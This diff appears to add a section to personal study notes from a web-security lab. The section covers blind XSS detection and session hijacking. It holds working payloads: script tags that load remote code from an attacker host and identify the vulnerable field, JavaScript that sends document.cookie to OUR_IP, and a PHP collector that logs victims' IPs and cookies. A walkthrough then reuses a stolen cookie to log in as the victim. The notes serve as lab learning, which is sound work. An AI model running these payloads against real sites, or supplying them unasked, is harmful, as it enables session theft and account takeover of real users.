@@ -440,9 +440,133 @@ sudo php -S 0.0.0.0:80
 
 then with our script it will redirect users after stealing the credentials, then if we check the creds.txt file we can see all of the collected credentials
 
+## Session Hijacking
 
+modern web apps use cookies to maintain a user's session throughout browsing sessions    
+if a threat actor obtains these cookies then they might be able to gain logged-in access with the victim's account without knowing their credentials 
 
+session hijacking = cookie stealing 
 
+### Blind XSS detection 
 
+blind XSS occurs when the vulnerability is triggered on a page we don't have access to 
 
+these typically occur with forms only accessible by certain users like admins, some examples are: 
+- contact forms
+- reviews
+- user details
+- support tickets 
+- HTTP User-Agent header 
 
+our test site shows a login form that on submit redirects us: 
+
+![](Images/Pasted%20image%2020240124202330.png)
+
+this indicates that we won't see how our input will be handled or how it will look in the browser, since it will appear for the admin only   
+
+we do not have access to the admin panel so we can't do our normal tests to see which payloads get a response   
+so how will we know when we get a successful injection? 
+
+to do this we can do the same trick of using a payload that sends an HTTP request back to our server   
+if the JS code gets executed we will get a response on our machine 
+
+however there are two issues: 
+- how can we know what specific field is vulnerable?
+- how can we know what XSS payload to use? 
+
+### Loading a remote script 
+
+in HTML we can load a remote JS file with: 
+
+`<script src="http://OUR_IP/script.js"></script>`
+
+we can change the requested script name to the name of the field we are injecting in, so that when we get the request in our VM we will know what the vulnerable input field that executed the script is: 
+
+`<script src="http://OUR_IP/username"></script>`
+
+if we get a request for `/username` then we know that it is vulnerable to XSS   
+so now we can start testing XSS payloads that load a remote script and see which one sends us a request
+
+some examples from payloadsallthethings: 
+
+```html
+<script src=http://OUR_IP></script>
+'><script src=http://OUR_IP></script>
+"><script src=http://OUR_IP></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+<script>$.getScript("http://OUR_IP")</script>
+```
+
+if we had access to the source code like in DOM XSS then we could be more precise in what would work for an injection   
+blind XSS is much more successful with DOM 
+
+so now we can go back to our form and inject these script tags with their relative names: 
+
+![](Images/Pasted%20image%2020240124204014.png)
+
+or we can use the full url:
+
+`http://10.129.46.176/hijacking/?fullname=<script src=http://10.10.15.210/fullname></script>&username=<script src=http://10.10.15.210/username></script>&password=<script src=http://10.10.15.210/password></script>&email=<script src=http://10.10.15.210/email></script>&imgurl=<script src=http://10.10.15.210/imgurl></script>`
+
+although we notice that even by not going through the UI the email field will always return invalid, meaning there is frontend and backend validation: 
+
+![](Images/Pasted%20image%2020240124204359.png)
+
+this means that it is not vulnerable and we can skip it   
+we may also want to skip the password variable because these are usually hashed and not shown in cleartext 
+
+our URL looks like: 
+
+`http://10.129.151.122/hijacking/?fullname=%3Cscript+src%3Dhttp%3A%2F%2F10.10.15.210%3A81%2Ffullname%3E%3C%2Fscript%3E&username=%3Cscript+src%3Dhttp%3A%2F%2F10.10.15.210%3A81%2Fusername%3E%3C%2Fscript%3E&password=test&email=test%40test.com&imgurl=%3Cscript+src%3Dhttp%3A%2F%2F10.10.15.210%3A81%2Fimgurl%3E%3C%2Fscript%3E`
+
+and when we go through and test different types of payloads we can see that the image url upload field is vulnerable after using the payload that starts with `">`:
+
+![](Images/Pasted%20image%2020240124205303.png)
+
+### Session hijacking 
+
+session hijacking is very similar to phishing, we will need a JS payload to send us the required data and a PHP script on our server to grab and parse the transmitted data   
+
+there are many JS payloads to grab the session cookie like: 
+
+```javascript
+document.location='http://OUR_IP/index.php?c='+document.cookie;
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+```
+
+the first will navigate to our cookie grabber page and the second adds an image to the page
+
+we can add either of these into our php server into `script.js`
+
+now we can use our script as part of the vulnerable input field and we should get calls to our server with session cookies   
+however, if there are a lot of cookies then we might not know which cookie belongs to which header   
+this is where we can use our PHP script to parse them and write them to file: 
+
+```php
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+```
+
+then, assuming we have use our payload to load the script.js file, when the user's browser executes the code we will get a response on our server with the cookie value: 
+
+![](Images/Pasted%20image%2020240124210426.png)
+
+so now we can go to the login page and add a cookie in our devtools to match the one we found: 
+
+![](Images/Pasted%20image%2020240124210653.png)
+
+then refreshing the page we can see that we have successfully logged in: 
+
+![](Images/Pasted%20image%2020240124210737.png)
+
+## XSS Prevention 
